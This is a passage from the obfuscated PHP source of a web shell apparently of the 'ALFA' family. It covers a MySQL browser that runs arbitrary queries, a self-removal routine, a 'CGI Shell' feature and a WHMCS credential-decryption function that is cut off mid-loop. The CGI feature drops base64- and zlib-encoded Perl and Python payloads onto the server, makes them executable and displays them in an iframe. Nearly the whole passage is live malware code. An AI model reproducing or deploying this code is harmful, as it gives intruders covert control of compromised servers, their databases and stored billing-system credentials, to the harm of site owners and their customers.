				$zedzftuyb2021c4149dfd5dc85c88823b7df34bd .= "'".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)."',";
			}
			$pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19 = substr($pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19, 0, -1);
			$zedzftuyb2021c4149dfd5dc85c88823b7df34bd = substr($zedzftuyb2021c4149dfd5dc85c88823b7df34bd, 0, -1);
			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = $ciexurcd1b1cc7f086b3f074da452bc3129981eb . "(" . $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19 . ")" . "VALUES(" . $zedzftuyb2021c4149dfd5dc85c88823b7df34bd . ")";
			$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
			echo @json_encode(array("status" => $ybaqpbzt9b207167e5381c47682c6b4f58a623fb, "error" => @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898)));
		}else{
			$qbxhislrb3b32a2d422265cd25c3323ed0157f81 = 0;
			$ubqoiylnd5d3db1765287eef77d7927cc956f50a = false;
			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "";
			$btudbolwbb6222905ef8419183b5437779497596 = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
			$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = 0;
			$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
			$aiidhoir54ca84a794888fe8d92834787dfa935a = array();
			if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "load_data"){
				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` LIMIT 0,30";
				$giyhocxd788c8f500cc1bb898988079084ced1bc = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COUNT(*) FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."`");
				$qswpaoms4c6506afca4799d1a83f0fcaed9d0161 = @mysqli_fetch_row($giyhocxd788c8f500cc1bb898988079084ced1bc);
				$ylrerbsc7d923585d45eaf069fa072333facbbe1 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."' AND `TABLE_NAME` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."'");
				while($rfymspstcb08a1efc05437dd1a1358f362b2ecb8 = @mysqli_fetch_array($ylrerbsc7d923585d45eaf069fa072333facbbe1, MYSQLI_ASSOC)){
					$aiidhoir54ca84a794888fe8d92834787dfa935a[] = $rfymspstcb08a1efc05437dd1a1358f362b2ecb8;
				}
				if($qswpaoms4c6506afca4799d1a83f0fcaed9d0161[0] > 30){
					$qbxhislrb3b32a2d422265cd25c3323ed0157f81 = ceil($qswpaoms4c6506afca4799d1a83f0fcaed9d0161[0] / 30);
				}
			}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "query"){
				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = $dhkkpmvsd77d5e503ad1439f585ac494268b351b["query"];
			}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "page"){
				$dhkkpmvsd77d5e503ad1439f585ac494268b351b["page"] = (int)$dhkkpmvsd77d5e503ad1439f585ac494268b351b["page"] - 1;
				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` LIMIT ".($dhkkpmvsd77d5e503ad1439f585ac494268b351b["page"]*30).",30";
			}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "search"){
				$khftbobz06a943c59f33a34bb5924aaf72cd2995 = "";
				$yogevfcjd0c6566acbbf4d1d5ee7d9e7e07f8fd9 = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
				foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["search"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
					$lrtwlwksc1d0fcd08d7e2e1b35d20364a77f79ca = in_array($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"], $yogevfcjd0c6566acbbf4d1d5ee7d9e7e07f8fd9);
					if(empty($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["value"]) && !$lrtwlwksc1d0fcd08d7e2e1b35d20364a77f79ca)continue;
					if(strstr($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"], "...") || $lrtwlwksc1d0fcd08d7e2e1b35d20364a77f79ca){
						$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"] = str_replace("...", $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["value"], $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"]);
						$khftbobz06a943c59f33a34bb5924aaf72cd2995 .= $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . " " . $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"] . " AND ";
					}else{
						$khftbobz06a943c59f33a34bb5924aaf72cd2995 .= $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . " " . $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"] . " '".addslashes($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["value"])."' AND ";
					}
				}
				$khftbobz06a943c59f33a34bb5924aaf72cd2995 .= "1=1";
				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` WHERE " . $khftbobz06a943c59f33a34bb5924aaf72cd2995;
			}
			$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
			if(!$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f){
				echo @json_encode(array("status" => false, "error" => @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898), "query" => $ciexurcd1b1cc7f086b3f074da452bc3129981eb));
				return false;
			}
			$wylowyxn455297d99eac97629deac972ea5e60d6 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"])."' AND TABLE_NAME = '".@addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"])."' AND COLUMN_KEY = 'PRI'");
			if($wylowyxn455297d99eac97629deac972ea5e60d6){
				$wylowyxn455297d99eac97629deac972ea5e60d6 = @mysqli_fetch_row($wylowyxn455297d99eac97629deac972ea5e60d6);
				$wylowyxn455297d99eac97629deac972ea5e60d6 = $wylowyxn455297d99eac97629deac972ea5e60d6[0];
				if(!empty($wylowyxn455297d99eac97629deac972ea5e60d6)){
					$btudbolwbb6222905ef8419183b5437779497596 = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$wylowyxn455297d99eac97629deac972ea5e60d6.'" tbl_name="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"].'" db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" 	db_target="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
				}
			}else{
				$wylowyxn455297d99eac97629deac972ea5e60d6 = false;
			}
			while($geklwdir447b7147e84be512208dcc0995d67ebc = @mysqli_fetch_assoc($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
				if(!$ubqoiylnd5d3db1765287eef77d7927cc956f50a){
					$btudbolwbb6222905ef8419183b5437779497596 .= '<tr style="background-color:#305b8e;">';
					if($wylowyxn455297d99eac97629deac972ea5e60d6){
						$btudbolwbb6222905ef8419183b5437779497596 .= '<th style="width: 55px;text-align:center;"><input db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
					}
					foreach($geklwdir447b7147e84be512208dcc0995d67ebc as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
						$btudbolwbb6222905ef8419183b5437779497596 .= '<th>'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'</th>';
					}
					reset($geklwdir447b7147e84be512208dcc0995d67ebc);
					$ubqoiylnd5d3db1765287eef77d7927cc956f50a=true;
					$btudbolwbb6222905ef8419183b5437779497596 .= '</tr><tr>';
				}

				if($wylowyxn455297d99eac97629deac972ea5e60d6){
					$heibofcfb57c7e31313f57e4d1fd215613b10159 = '<td style="text-align:center;"><input row_id="'.$yeshcnjz6438c669e0d0de98e6929c2cc0fac474.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$geklwdir447b7147e84be512208dcc0995d67ebc[$wylowyxn455297d99eac97629deac972ea5e60d6].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" db_target="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"].'" tbl_name="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"].'" col_key="'.$wylowyxn455297d99eac97629deac972ea5e60d6.'" key="'.$geklwdir447b7147e84be512208dcc0995d67ebc[$wylowyxn455297d99eac97629deac972ea5e60d6].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" db_target="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"].'" tbl_name="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"].'" col_key="'.$wylowyxn455297d99eac97629deac972ea5e60d6.'" key="'.$geklwdir447b7147e84be512208dcc0995d67ebc[$wylowyxn455297d99eac97629deac972ea5e60d6].'" row_id="'.$yeshcnjz6438c669e0d0de98e6929c2cc0fac474.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
				}
				$btudbolwbb6222905ef8419183b5437779497596 .= '<tr class="tbl_row tbl_row_l'.$yeshcnjz6438c669e0d0de98e6929c2cc0fac474.'">'.$heibofcfb57c7e31313f57e4d1fd215613b10159;
				$yeshcnjz6438c669e0d0de98e6929c2cc0fac474++;
				foreach($geklwdir447b7147e84be512208dcc0995d67ebc as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
					if($rkptsoeg2063c1608d6e0baf80249c42e2be5804 == null){
						$btudbolwbb6222905ef8419183b5437779497596 .= '<td><i>null</i></td>';
					}else{
						$btudbolwbb6222905ef8419183b5437779497596 .= '<td>'.nl2br(htmlspecialchars($rkptsoeg2063c1608d6e0baf80249c42e2be5804)).'</td>';
				}
				}
				$btudbolwbb6222905ef8419183b5437779497596 .= '</tr>';
			}
			$btudbolwbb6222905ef8419183b5437779497596 .= '</table>';
			if(!$ubqoiylnd5d3db1765287eef77d7927cc956f50a){
				$btudbolwbb6222905ef8419183b5437779497596 = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
			}
			echo @json_encode(array("status" => true, "table" => $btudbolwbb6222905ef8419183b5437779497596, "columns" => $aiidhoir54ca84a794888fe8d92834787dfa935a, "pages" => $qbxhislrb3b32a2d422265cd25c3323ed0157f81, "query" => $ciexurcd1b1cc7f086b3f074da452bc3129981eb));
		}
		@mysqli_close($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898);
	}
}
function alfaselfrm(){
if(isset($_POST['alfa1'])&&$_POST['alfa1']=='yes'){
echo(__pre().'<center>');
if(@unlink($GLOBALS['__file_path'])){
echo('<b>Shell has been removed</i> :)</b>');
}else{
echo 'unlink error!';
}
echo('</center>');
}
if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
echo "<div class=header>";
echo "
<center><p><img src=\"http://solevisible.com/images/farvahar-iran.png\"></p>";
echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
echo '</p></center></div>';
}
}
function alfacgishell(){
alfahead();
$sqznsikw38696558dc98494c08d951c052900a2a = "";
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
if(!in_array($_POST['alfa1'],array('perl','py'))){
$sqznsikw38696558dc98494c08d951c052900a2a = "</div>";
echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'perl\')">| Perl | </a><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'py\');">| Python | </a>';
}
if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],array('perl','py'))){
@mkdir('cgialfa',0755);
@chdir('cgialfa');
alfacgihtaccess('cgi');
$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $_POST['alfa1'].'.alfa';
$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80 = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';;
$jbyuabyldfed5bc177b87ab317c584e06566adc6 = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
if($_POST['alfa1']=='perl'){$nndigmblc13367945d5d4c91047b3b50234aa7ab = $pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80;}else{$nndigmblc13367945d5d4c91047b3b50234aa7ab = $jbyuabyldfed5bc177b87ab317c584e06566adc6;}
if(__write_file($kkkpgnftb068931cc450442b63f5b3d276ea4297,$nndigmblc13367945d5d4c91047b3b50234aa7ab)){
@chmod($kkkpgnftb068931cc450442b63f5b3d276ea4297,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$kkkpgnftb068931cc450442b63f5b3d276ea4297.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $sqznsikw38696558dc98494c08d951c052900a2a;
alfafooter();
}
function alfaWhmcs(){
alfahead();
echo '<div class=header>';
function decrypt($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$dnhhacaie8bd59452f341502dc3614d3e30ca4d3){
$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = md5 (md5 ($dnhhacaie8bd59452f341502dc3614d3e30ca4d3)) . md5 ($dnhhacaie8bd59452f341502dc3614d3e30ca4d3);
$vmzgewrw191afdc6eb59e8dc47de536bbf23f199 = _hash($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
$jeplkfmp219696c345c0a93403933a08c81b6fac = strlen ($vmzgewrw191afdc6eb59e8dc47de536bbf23f199);
$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = __ZGVjb2Rlcg($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
$ozdsbxfifce516bd723883202dc5cf36a84a96a2 = substr ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21, 0, $jeplkfmp219696c345c0a93403933a08c81b6fac);
$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = substr ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21, $jeplkfmp219696c345c0a93403933a08c81b6fac, strlen ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21) - $jeplkfmp219696c345c0a93403933a08c81b6fac);
$nxtodlobf0b53b2da041fca49ef0b9839060b345 = $vemvtkqkc68271a63ddbc431c307beb7d2918275 = '';
$yyphbkaj4a8a08f09d37b73795649038408b5f33 = 0;
while ($yyphbkaj4a8a08f09d37b73795649038408b5f33 < $jeplkfmp219696c345c0a93403933a08c81b6fac)
{
$nxtodlobf0b53b2da041fca49ef0b9839060b345 .= chr (ord ($ozdsbxfifce516bd723883202dc5cf36a84a96a2[$yyphbkaj4a8a08f09d37b73795649038408b5f33]) ^ ord ($vmzgewrw191afdc6eb59e8dc47de536bbf23f199[$yyphbkaj4a8a08f09d37b73795649038408b5f33]));
++$yyphbkaj4a8a08f09d37b73795649038408b5f33;
}
